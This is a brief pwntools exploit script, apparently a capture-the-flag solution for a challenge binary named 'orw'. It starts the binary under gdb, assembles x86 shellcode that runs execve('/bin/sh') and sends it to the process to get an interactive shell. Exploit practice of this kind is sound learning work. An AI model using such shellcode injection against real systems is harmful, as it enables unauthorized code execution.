#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
p = process('./orw')
gdb.attach(p,'b * 0x08048582')

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

p.recv()
p.send(shellcode)
p.interactive()
